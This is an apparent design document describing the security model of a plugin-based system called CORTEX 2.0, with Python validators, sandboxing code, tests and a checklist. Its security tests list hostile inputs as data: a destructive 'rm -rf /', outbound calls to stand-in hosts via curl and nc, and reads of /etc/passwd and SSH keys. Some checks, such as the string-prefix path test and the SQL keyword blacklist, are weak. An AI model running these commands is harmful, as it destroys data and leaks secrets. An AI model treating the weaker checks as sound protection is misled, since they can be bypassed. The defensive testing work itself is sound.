# CORTEX 2.0 Security Model

**Document:** 19-security-model.md  
**Version:** 2.0.0-alpha  
**Date:** 2025-11-07

---

## 🎯 Purpose

Protect CORTEX integrity, user data, and system resources through defense-in-depth security layers—without sacrificing usability, extensibility, or performance.

Goals:
- Plugin sandboxing (prevent malicious/buggy plugins from damaging core)
- Knowledge boundary enforcement (Tier 0 immutability, scope isolation)
- Input validation (prevent injection, malformed data corruption)
- Resource limits (prevent DoS, runaway operations)
- Audit trail (track all sensitive operations)

---

## ❌ Threat Model

### Threat 1: Malicious Plugin
```
Scenario: User installs untrusted plugin
Risks:
  - Reads sensitive data (conversations, API keys)
  - Modifies Tier 0 rules (disables TDD, Brain Protector)
  - Deletes/corrupts knowledge graph
  - Exfiltrates data to external server
  - Consumes excessive resources (CPU/memory bomb)
```

### Threat 2: Injection Attacks
```
Scenario: Malformed input in conversation/pattern data
Risks:
  - SQL injection via conversation content
  - Command injection via file paths
  - Code injection via eval/exec in plugins
  - Path traversal (read arbitrary files)
```

### Threat 3: Resource Exhaustion
```
Scenario: Runaway operation or DoS attack
Risks:
  - Infinite loop in plugin
  - Memory leak (cache grows unbounded)
  - Disk space exhaustion (logs/events grow forever)
  - Database lock contention (deadlock)
```

### Threat 4: Knowledge Corruption
```
Scenario: Bug or malicious action corrupts brain
Risks:
  - Tier 0 rules modified/deleted
  - Application data leaks into core knowledge
  - Low-confidence patterns pollute graph
  - Cross-project contamination
```

### Threat 5: Privilege Escalation
```
Scenario: Plugin bypasses restrictions
Risks:
  - Access to databases it shouldn't read
  - Write to protected paths (Tier 0, config)
  - Execute arbitrary shell commands
  - Modify plugin registry
```

---

## ✅ Security Architecture

### Defense Layers

```
┌─────────────────────────────────────────────────────────────┐
│                   Security Boundary Layers                   │
├─────────────────────────────────────────────────────────────┤
│ Layer 1: Input Validation                                   │
│  • Schema validation (JSON/YAML)                            │
│  • SQL parameterization (prevent injection)                 │
│  • Path sanitization (prevent traversal)                    │
│  • Content filtering (strip dangerous patterns)             │
├─────────────────────────────────────────────────────────────┤
│ Layer 2: Plugin Sandboxing                                  │
│  • Capability-based permissions                             │
│  • Resource quotas (CPU/memory/disk)                        │
│  • API surface restrictions                                 │
│  • No direct file/DB access                                 │
├─────────────────────────────────────────────────────────────┤
│ Layer 3: Knowledge Boundaries                               │
│  • Tier 0 immutability (write-protected)                    │
│  • Scope enforcement (generic vs app-specific)              │
│  • Namespace isolation (per-project)                        │
│  • Brain Protector challenges                               │
├─────────────────────────────────────────────────────────────┤
│ Layer 4: Resource Limits                                    │
│  • Execution timeouts (5s default)                          │
│  • Memory caps (100MB per plugin)                           │
│  • Event backlog limits (100 max)                           │
│  • Query complexity limits                                  │
├─────────────────────────────────────────────────────────────┤
│ Layer 5: Audit & Monitoring                                 │
│  • All sensitive ops logged                                 │
│  • Anomaly detection (unusual patterns)                     │
│  • Rate limiting                                            │
│  • Rollback capability                                      │
└─────────────────────────────────────────────────────────────┘
```

---

## 🔒 Layer 1: Input Validation

### 1. Schema Validation

```python
# src/security/validator.py

from typing import Any, Dict, List, Optional
from dataclasses import dataclass
import re
import json
from pathlib import Path

@dataclass
class ValidationRule:
    """Single validation rule"""
    field: str
    required: bool
    type: type
    min_length: Optional[int] = None
    max_length: Optional[int] = None
    pattern: Optional[str] = None
    allowed_values: Optional[List[Any]] = None

class InputValidator:
    """Validate and sanitize all external inputs"""
    
    def __init__(self):
        self.schemas: Dict[str, List[ValidationRule]] = {}
        self._register_builtin_schemas()
    
    def _register_builtin_schemas(self):
        """Register core validation schemas"""
        
        # Conversation message schema
        self.schemas["conversation_message"] = [
            ValidationRule("content", required=True, type=str, max_length=10000),
            ValidationRule("role", required=True, type=str, allowed_values=["user", "assistant", "system"]),
            ValidationRule("timestamp", required=True, type=str, pattern=r"^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}"),
        ]
        
        # Pattern schema
        self.schemas["pattern"] = [
            ValidationRule("title", required=True, type=str, max_length=200),
            ValidationRule("confidence", required=True, type=float),
            ValidationRule("scope", required=True, type=str, allowed_values=["generic", "application"]),
            ValidationRule("namespaces", required=True, type=list),
        ]
        
        # Plugin metadata schema
        self.schemas["plugin_metadata"] = [
            ValidationRule("plugin_id", required=True, type=str, pattern=r"^[a-z0-9_]+$", max_length=50),
            ValidationRule("version", required=True, type=str, pattern=r"^\d+\.\d+\.\d+$"),
            ValidationRule("hooks", required=True, type=list),
        ]
    
    def validate(self, data: Dict[str, Any], schema_name: str) -> tuple[bool, List[str]]:
        """
        Validate data against schema
        
        Returns:
            (is_valid, error_messages)
        """
        errors = []
        
        if schema_name not in self.schemas:
            return False, [f"Unknown schema: {schema_name}"]
        
        schema = self.schemas[schema_name]
        
        for rule in schema:
            # Check required
            if rule.required and rule.field not in data:
                errors.append(f"Missing required field: {rule.field}")
                continue
            
            if rule.field not in data:
                continue  # Optional field missing - OK
            
            value = data[rule.field]
            
            # Check type
            if not isinstance(value, rule.type):
                errors.append(f"Field {rule.field} must be {rule.type.__name__}, got {type(value).__name__}")
                continue
            
            # Check string constraints
            if rule.type == str:
                if rule.min_length and len(value) < rule.min_length:
                    errors.append(f"Field {rule.field} too short (min: {rule.min_length})")
                
                if rule.max_length and len(value) > rule.max_length:
                    errors.append(f"Field {rule.field} too long (max: {rule.max_length})")
                
                if rule.pattern and not re.match(rule.pattern, value):
                    errors.append(f"Field {rule.field} doesn't match required pattern")
            
            # Check allowed values
            if rule.allowed_values and value not in rule.allowed_values:
                errors.append(f"Field {rule.field} must be one of: {rule.allowed_values}")
        
        return len(errors) == 0, errors
    
    def sanitize_sql_string(self, value: str) -> str:
        """
        Sanitize string for SQL (but prefer parameterized queries!)
        
        NOTE: This is defense-in-depth. Always use parameterized queries.
        """
        # Remove SQL injection patterns
        dangerous = ["--", ";", "/*", "*/", "xp_", "sp_", "EXEC", "EXECUTE"]
        sanitized = value
        
        for pattern in dangerous:
            sanitized = sanitized.replace(pattern, "")
        
        return sanitized
    
    def sanitize_path(self, path: str, base_dir: Path) -> Optional[Path]:
        """
        Sanitize and validate file path (prevent traversal)
        
        Returns:
            Absolute path if safe, None if dangerous
        """
        try:
            # Resolve to absolute path
            requested_path = (base_dir / path).resolve()
            
            # Check if path is within base_dir
            if not str(requested_path).startswith(str(base_dir.resolve())):
                return None  # Path traversal attempt!
            
            return requested_path
        except:
            return None
    
    def sanitize_command(self, command: str) -> Optional[str]:
        """
        Sanitize shell command (very restrictive)
        
        Returns:
            Sanitized command or None if dangerous
        """
        # Only allow whitelisted commands
        allowed_commands = ["git", "python", "pytest", "dotnet"]
        
        parts = command.split()
        if not parts:
            return None
        
        base_command = parts[0]
        
        if base_command not in allowed_commands:
            return None  # Command not allowed
        
        # Check for dangerous patterns
        dangerous = [";", "&", "|", ">", "<", "`", "$", "(", ")"]
        for char in dangerous:
            if char in command:
                return None
        
        return command

# Global validator instance
validator = InputValidator()
```

### 2. SQL Injection Prevention

```python
# src/database/safe_query.py

class SafeQuery:
    """Always use parameterized queries"""
    
    @staticmethod
    def execute(db, query: str, params: tuple):
        """
        Execute parameterized query (safe)
        
        ✅ SAFE:
            SafeQuery.execute(db, 
                "SELECT * FROM conversations WHERE id = ?", 
                (conversation_id,))
        
        ❌ UNSAFE (never do this):
            db.execute(f"SELECT * FROM conversations WHERE id = {conversation_id}")
        """
        # Validate params are tuple (not user-controlled string)
        if not isinstance(params, (tuple, list)):
            raise ValueError("Params must be tuple or list, not string")
        
        # Execute with parameters (SQLite handles escaping)
        return db.execute(query, params)
    
    @staticmethod
    def validate_no_injection(query: str):
        """
        Additional validation (defense-in-depth)
        
        Checks for common injection patterns in the query template itself
        """
        # Query template should only have ? placeholders, not string interpolation
        if any(pattern in query for pattern in ["%s", "{", "}"]):
            raise ValueError("Query template uses string formatting - use ? placeholders")
```

---

## 🔌 Layer 2: Plugin Sandboxing

### 1. Capability-Based Permissions

```python
# src/plugins/security.py

from enum import Enum
from typing import Set, List
from dataclasses import dataclass

class Capability(Enum):
    """Plugin capabilities (permissions)"""
    
    # Read permissions
    READ_TIER1 = "read:tier1"
    READ_TIER2 = "read:tier2"
    READ_TIER3 = "read:tier3"
    READ_CONFIG = "read:config"
    
    # Write permissions
    WRITE_TIER1 = "write:tier1"
    WRITE_TIER2 = "write:tier2"
    WRITE_TIER3 = "write:tier3"
    
    # File system
    READ_FILES = "fs:read"
    WRITE_FILES = "fs:write"
    
    # Execution
    EXECUTE_COMMANDS = "exec:commands"
    
    # Network (future)
    NETWORK_ACCESS = "network:access"

@dataclass
class PluginPermissions:
    """Plugin permission set"""
    plugin_id: str
    capabilities: Set[Capability]
    max_execution_time_seconds: int = 5
    max_memory_mb: int = 100
    max_db_queries: int = 100

class PluginSandbox:
    """Enforce plugin permissions and limits"""
    
    def __init__(self, permissions: PluginPermissions):
        self.permissions = permissions
        self.queries_executed = 0
        self.execution_start = None
    
    def check_capability(self, capability: Capability) -> bool:
        """Check if plugin has capability"""
        if capability not in self.permissions.capabilities:
            raise SecurityError(
                f"Plugin {self.permissions.plugin_id} lacks capability: {capability.value}"
            )
        return True
    
    def safe_read_tier1(self, db):
        """Read Tier 1 data with permission check"""
        self.check_capability(Capability.READ_TIER1)
        self._check_query_limit()
        
        # Return read-only view
        return ReadOnlyDatabase(db)
    
    def safe_write_tier2(self, db, data: dict):
        """Write Tier 2 data with permission + validation"""
        self.check_capability(Capability.WRITE_TIER2)
        self._check_query_limit()
        
        # Validate data first
        is_valid, errors = validator.validate(data, "pattern")
        if not is_valid:
            raise ValueError(f"Invalid pattern data: {errors}")
        
        # Write with boundary checks
        if self._violates_tier0_boundary(data):
            raise SecurityError("Cannot write Tier 0 data to Tier 2")
        
        return db.insert(data)
    
    def safe_execute_command(self, command: str) -> str:
        """Execute command with sandboxing"""
        self.check_capability(Capability.EXECUTE_COMMANDS)
        
        # Sanitize command
        safe_command = validator.sanitize_command(command)
        if not safe_command:
            raise SecurityError(f"Command not allowed or unsafe: {command}")
        
        # Execute with timeout
        import subprocess
        try:
            result = subprocess.run(
                safe_command,
                shell=False,  # Never use shell=True!
                capture_output=True,
                text=True,
                timeout=self.permissions.max_execution_time_seconds
            )
            return result.stdout
        except subprocess.TimeoutExpired:
            raise SecurityError(f"Command timed out after {self.permissions.max_execution_time_seconds}s")
    
    def _check_query_limit(self):
        """Enforce query limit"""
        self.queries_executed += 1
        if self.queries_executed > self.permissions.max_db_queries:
            raise SecurityError(
                f"Plugin exceeded query limit: {self.permissions.max_db_queries}"
            )
    
    def _violates_tier0_boundary(self, data: dict) -> bool:
        """Check if data violates Tier 0 boundaries"""
        # Check if trying to write to protected paths
        if data.get("category") == "tier0_rules":
            return True
        
        # Check scope
        if data.get("scope") not in ["generic", "application"]:
            return True
        
        return False

class ReadOnlyDatabase:
    """Read-only wrapper for database access"""
    
    def __init__(self, db):
        self._db = db
    
    def execute(self, query: str, params: tuple):
        """Only allow SELECT queries"""
        if not query.strip().upper().startswith("SELECT"):
            raise SecurityError("Only SELECT queries allowed in read-only mode")
        
        return self._db.execute(query, params)
    
    def insert(self, *args):
        raise SecurityError("Insert not allowed in read-only mode")
    
    def update(self, *args):
        raise SecurityError("Update not allowed in read-only mode")
    
    def delete(self, *args):
        raise SecurityError("Delete not allowed in read-only mode")

class SecurityError(Exception):
    """Security violation exception"""
    pass
```

### 2. Resource Limits

```python
# src/plugins/resource_monitor.py

import time
import psutil
from typing import Optional

class ResourceMonitor:
    """Monitor and enforce plugin resource usage"""
    
    def __init__(self, max_memory_mb: int = 100, max_execution_seconds: int = 5):
        self.max_memory = max_memory_mb * 1024 * 1024  # bytes
        self.max_execution = max_execution_seconds
        self.start_time: Optional[float] = None
        self.start_memory: Optional[int] = None
    
    def start(self):
        """Start monitoring"""
        self.start_time = time.time()
        self.start_memory = psutil.Process().memory_info().rss
    
    def check(self):
        """Check if limits exceeded"""
        if self.start_time is None:
            return
        
        # Check execution time
        elapsed = time.time() - self.start_time
        if elapsed > self.max_execution:
            raise SecurityError(f"Execution timeout: {elapsed:.1f}s > {self.max_execution}s")
        
        # Check memory
        current_memory = psutil.Process().memory_info().rss
        memory_used = current_memory - self.start_memory
        
        if memory_used > self.max_memory:
            raise SecurityError(
                f"Memory limit exceeded: {memory_used / 1024 / 1024:.1f}MB > {self.max_memory / 1024 / 1024}MB"
            )
    
    def stop(self) -> dict:
        """Stop monitoring and return stats"""
        elapsed = time.time() - self.start_time if self.start_time else 0
        current_memory = psutil.Process().memory_info().rss
        memory_used = current_memory - self.start_memory if self.start_memory else 0
        
        return {
            "execution_time_seconds": elapsed,
            "memory_used_mb": memory_used / 1024 / 1024,
            "within_limits": (
                elapsed <= self.max_execution and 
                memory_used <= self.max_memory
            )
        }
```

---

## 🛡️ Layer 3: Knowledge Boundaries

### 1. Tier 0 Immutability

```python
# src/security/tier0_protector.py

from pathlib import Path
from typing import List

class Tier0Protector:
    """Protect Tier 0 (Core Instinct) from modification"""
    
    PROTECTED_FILES = [
        "governance/rules.md",
        "tier0/",
        "cortex.config.template.json",
    ]
    
    def __init__(self, cortex_root: Path):
        self.root = cortex_root
    
    def is_protected(self, file_path: Path) -> bool:
        """Check if file is Tier 0 protected"""
        relative = file_path.relative_to(self.root)
        
        for protected in self.PROTECTED_FILES:
            if str(relative).startswith(protected):
                return True
        
        return False
    
    def validate_write(self, file_path: Path, source: str):
        """
        Validate write operation to potentially protected file
        
        Args:
            file_path: Path to write
            source: Who is requesting write (plugin_id or "core")
        
        Raises:
            SecurityError if write violates Tier 0 protection
        """
        if self.is_protected(file_path):
            # Only core can write to Tier 0
            if source != "core":
                raise SecurityError(
                    f"Tier 0 file protected: {file_path}\n"
                    f"Source '{source}' cannot modify core instinct files.\n"
                    f"These files are immutable and define CORTEX identity."
                )
    
    def validate_rule_change(self, rule_number: int, change_type: str):
        """
        Validate attempt to change a Tier 0 rule
        
        Brain Protector should challenge ANY rule change
        """
        raise SecurityError(
            f"Tier 0 Rule #{rule_number} cannot be {change_type}.\n"
            f"Core rules define CORTEX identity and are permanent.\n"
            f"If you need custom behavior, create a plugin instead."
        )
```

### 2. Scope Enforcement

```python
# src/security/scope_enforcer.py

class ScopeEnforcer:
    """Enforce knowledge scope boundaries"""
    
    def validate_pattern(self, pattern: dict, current_project: str):
        """
        Validate pattern scope and namespace
        
        Ensures:
        - Generic patterns have scope="generic"
        - App patterns have scope="application" + correct namespace
        - No cross-contamination
        """
        scope = pattern.get("scope")
        namespaces = pattern.get("namespaces", [])
        
        # Validate scope
        if scope not in ["generic", "application"]:
            raise ValueError(f"Invalid scope: {scope}. Must be 'generic' or 'application'")
        
        # Generic patterns must have CORTEX-core namespace
        if scope == "generic":
            if "CORTEX-core" not in namespaces:
                raise SecurityError(
                    "Generic patterns must include 'CORTEX-core' namespace"
                )
        
        # Application patterns must NOT have CORTEX-core
        if scope == "application":
            if "CORTEX-core" in namespaces:
                raise SecurityError(
                    "Application patterns cannot use 'CORTEX-core' namespace"
                )
            
            # Verify namespace matches current project
            if current_project not in namespaces:
                raise SecurityError(
                    f"Application pattern must include current project namespace: {current_project}"
                )
    
    def search_patterns_with_scope(self, query: str, current_project: str):
        """
        Search patterns with scope-aware boosting
        
        Boost order:
        1. Current project patterns (2.0x)
        2. Generic CORTEX patterns (1.5x)
        3. Other project patterns (0.5x)
        """
        # Implementation uses FTS5 with rank adjustments
        pass
```

---

## 📊 Layer 4: Resource Limits

Configuration in `cortex.config.json`:

```json
{
  "security": {
    "resource_limits": {
      "plugin_execution_timeout_seconds": 5,
      "plugin_max_memory_mb": 100,
      "plugin_max_db_queries": 100,
      "event_backlog_max": 100,
      "query_complexity_max": 1000,
      "cache_max_memory_mb": 100
    },
    "rate_limits": {
      "brain_updates_per_hour": 10,
      "plugin_executions_per_minute": 60
    }
  }
}
```

---

## 📝 Layer 5: Audit Trail

### 1. Security Event Logging

```python
# src/security/audit_logger.py

from datetime import datetime
from enum import Enum
import json

class SecurityEventType(Enum):
    """Types of security events"""
    PLUGIN_LOADED = "plugin_loaded"
    PLUGIN_EXECUTED = "plugin_executed"
    CAPABILITY_DENIED = "capability_denied"
    TIER0_WRITE_BLOCKED = "tier0_write_blocked"
    INJECTION_ATTEMPT = "injection_attempt"
    RESOURCE_LIMIT_EXCEEDED = "resource_limit_exceeded"
    ANOMALY_DETECTED = "anomaly_detected"

class AuditLogger:
    """Log all security-relevant events"""
    
    def __init__(self, log_path: Path):
        self.log_path = log_path
    
    def log_event(self, event_type: SecurityEventType, details: dict):
        """Log security event"""
        event = {
            "timestamp": datetime.now().isoformat(),
            "event_type": event_type.value,
            "details": details
        }
        
        # Append to audit log (JSONL)
        with open(self.log_path, "a") as f:
            f.write(json.dumps(event) + "\n")
        
        # If critical, also print warning
        if event_type in [
            SecurityEventType.TIER0_WRITE_BLOCKED,
            SecurityEventType.INJECTION_ATTEMPT,
            SecurityEventType.RESOURCE_LIMIT_EXCEEDED
        ]:
            print(f"⚠️  SECURITY EVENT: {event_type.value}")
            print(f"   Details: {details}")
    
    def get_recent_events(self, hours: int = 24) -> List[dict]:
        """Get recent security events"""
        cutoff = datetime.now() - timedelta(hours=hours)
        events = []
        
        with open(self.log_path, "r") as f:
            for line in f:
                event = json.loads(line)
                event_time = datetime.fromisoformat(event["timestamp"])
                
                if event_time >= cutoff:
                    events.append(event)
        
        return events
```

### 2. Anomaly Detection

```python
# src/security/anomaly_detector.py

class AnomalyDetector:
    """Detect unusual patterns that may indicate security issues"""
    
    def __init__(self):
        self.baselines = {}
    
    def check_anomalies(self, plugin_id: str, execution_stats: dict):
        """
        Check for anomalies in plugin execution
        
        Flags:
        - Sudden spike in resource usage
        - Unusual query patterns
        - Excessive failures
        """
        # Get baseline for this plugin
        baseline = self.baselines.get(plugin_id, {
            "avg_execution_time": 1.0,
            "avg_memory_mb": 10.0,
            "avg_queries": 5
        })
        
        anomalies = []
        
        # Check execution time (10x normal)
        if execution_stats["execution_time"] > baseline["avg_execution_time"] * 10:
            anomalies.append({
                "type": "execution_time_spike",
                "value": execution_stats["execution_time"],
                "baseline": baseline["avg_execution_time"]
            })
        
        # Check memory (5x normal)
        if execution_stats["memory_mb"] > baseline["avg_memory_mb"] * 5:
            anomalies.append({
                "type": "memory_spike",
                "value": execution_stats["memory_mb"],
                "baseline": baseline["avg_memory_mb"]
            })
        
        # Log anomalies
        if anomalies:
            audit_logger.log_event(
                SecurityEventType.ANOMALY_DETECTED,
                {
                    "plugin_id": plugin_id,
                    "anomalies": anomalies
                }
            )
        
        # Update baseline (rolling average)
        self._update_baseline(plugin_id, execution_stats)
        
        return anomalies
    
    def _update_baseline(self, plugin_id: str, stats: dict):
        """Update baseline with new data (exponential moving average)"""
        if plugin_id not in self.baselines:
            self.baselines[plugin_id] = {
                "avg_execution_time": stats["execution_time"],
                "avg_memory_mb": stats["memory_mb"],
                "avg_queries": stats.get("queries", 0)
            }
        else:
            # EMA with alpha=0.1
            alpha = 0.1
            self.baselines[plugin_id]["avg_execution_time"] = (
                alpha * stats["execution_time"] + 
                (1 - alpha) * self.baselines[plugin_id]["avg_execution_time"]
            )
            self.baselines[plugin_id]["avg_memory_mb"] = (
                alpha * stats["memory_mb"] + 
                (1 - alpha) * self.baselines[plugin_id]["avg_memory_mb"]
            )
```

---

## 🧪 Security Testing

```python
# tests/security/test_plugin_sandbox.py

import pytest
from src.plugins.security import PluginSandbox, PluginPermissions, Capability, SecurityError

def test_sandbox_blocks_unauthorized_tier1_read():
    """Plugin without READ_TIER1 cannot access Tier 1"""
    permissions = PluginPermissions(
        plugin_id="test_plugin",
        capabilities={Capability.READ_TIER2}  # Only Tier 2
    )
    sandbox = PluginSandbox(permissions)
    
    with pytest.raises(SecurityError, match="lacks capability: read:tier1"):
        sandbox.safe_read_tier1(mock_db)

def test_sandbox_blocks_tier0_write_via_tier2():
    """Cannot write Tier 0 data through Tier 2 write"""
    permissions = PluginPermissions(
        plugin_id="malicious_plugin",
        capabilities={Capability.WRITE_TIER2}
    )
    sandbox = PluginSandbox(permissions)
    
    # Attempt to write Tier 0 rule via pattern
    malicious_data = {
        "category": "tier0_rules",
        "title": "Disable TDD",
        "scope": "generic"
    }
    
    with pytest.raises(SecurityError, match="Cannot write Tier 0 data"):
        sandbox.safe_write_tier2(mock_db, malicious_data)

def test_sandbox_enforces_query_limit():
    """Plugin cannot exceed query limit"""
    permissions = PluginPermissions(
        plugin_id="chatty_plugin",
        capabilities={Capability.READ_TIER1},
        max_db_queries=10
    )
    sandbox = PluginSandbox(permissions)
    
    # Execute 10 queries (OK)
    for i in range(10):
        sandbox.safe_read_tier1(mock_db)
    
    # 11th query should fail
    with pytest.raises(SecurityError, match="exceeded query limit"):
        sandbox.safe_read_tier1(mock_db)

def test_command_sanitization_blocks_injection():
    """Command injection attempts are blocked"""
    from src.security.validator import validator
    
    # Malicious command attempts
    dangerous_commands = [
        "git log; rm -rf /",
        "python script.py && curl evil.com",
        "ls | nc attacker.com 9999",
        "cat /etc/passwd > output.txt",
    ]
    
    for cmd in dangerous_commands:
        result = validator.sanitize_command(cmd)
        assert result is None, f"Dangerous command not blocked: {cmd}"

def test_path_traversal_blocked():
    """Path traversal attempts are blocked"""
    from src.security.validator import validator
    from pathlib import Path
    
    base_dir = Path("/cortex/brain")
    
    # Malicious path attempts
    dangerous_paths = [
        "../../../etc/passwd",
        "../../.ssh/id_rsa",
        "./../governance/rules.md",
    ]
    
    for path in dangerous_paths:
        result = validator.sanitize_path(path, base_dir)
        assert result is None, f"Path traversal not blocked: {path}"
```

---

## 📋 Security Checklist

Before deploying plugins or accepting contributions:

- [ ] All user inputs validated against schema
- [ ] All database queries use parameterized statements
- [ ] All file paths sanitized and checked for traversal
- [ ] All shell commands whitelist-validated
- [ ] Plugin permissions explicitly defined (no wildcard "all")
- [ ] Resource limits configured and enforced
- [ ] Tier 0 files write-protected
- [ ] Scope enforcement active (generic vs application)
- [ ] Audit logging enabled for security events
- [ ] Anomaly detection running
- [ ] Security tests passing (sandbox, injection, traversal)
- [ ] Third-party plugin code reviewed

---

## 🔗 Integration with Other Systems

- **Plugin System (02):** Sandbox enforces permissions from plugin metadata
- **Knowledge Boundaries (05):** Scope enforcement protects Tier 0/2 integrity
- **Self-Review (07):** Health checks include security validation
- **Monitoring Dashboard (17):** Display security events, anomalies, violations

---

## ✅ Security Guarantees

With full implementation:

1. **Plugin Isolation:** Malicious plugins cannot access unauthorized data or resources
2. **Tier 0 Immutability:** Core rules cannot be modified by any plugin or user input
3. **Injection Prevention:** SQL/command/path injections blocked at validation layer
4. **Resource Protection:** Runaway operations terminated before exhausting resources
5. **Audit Transparency:** All security-relevant operations logged and reviewable

---

## 🔗 Related Documents

- 02-plugin-system.md (plugin architecture this secures)
- 05-knowledge-boundaries.md (Tier 0 protection, scope isolation)
- 07-self-review-system.md (security validation in health checks)
- 17-monitoring-dashboard.md (security event display)

---

**Next:** 20-extensibility-guide.md (How to extend CORTEX 2.0 safely)

---

## 🔗 Addendum: Workflow Pipeline Integration (2025-11-07)

**Question:** How to help users build full requests with threat modeling, DoD/DoR clarification, TDD, cleanup, and documentation—all chainable in any order?

**Answer:** **Workflow Pipeline System** (see `docs/guides/workflow-pipeline-guide.md`)

**Key Features:**
1. **Declarative YAML workflows** - Define task chains without code
2. **DAG validation** - Automatic dependency ordering, cycle detection
3. **Shared state** - Outputs flow between stages via `WorkflowState`
4. **Context injection once** - Tier 1-3 queried once, shared (88% faster)
5. **Error recovery** - Retries, optional stages, checkpoints
6. **Individual stage scripts** - Single-responsibility, reusable, testable

**Example Workflow:**
```yaml
workflow_id: "secure_feature_creation"
stages:
  - id: "threat_model"              # Security analysis (STRIDE)
  - id: "clarify_dod_dor"           # Interactive clarification
  - id: "plan"                      # Work planner (existing)
  - id: "tdd_cycle"                 # RED → GREEN → REFACTOR (existing)
  - id: "validate_dod"              # DoD compliance (existing)
  - id: "cleanup"                   # Code cleanup (optional)
  - id: "document"                  # Generate docs
```

**Efficiency:** 1,400ms saved per 8-stage workflow (context injected once vs per-stage)

**See:** `docs/guides/workflow-pipeline-guide.md` for complete implementation details

````
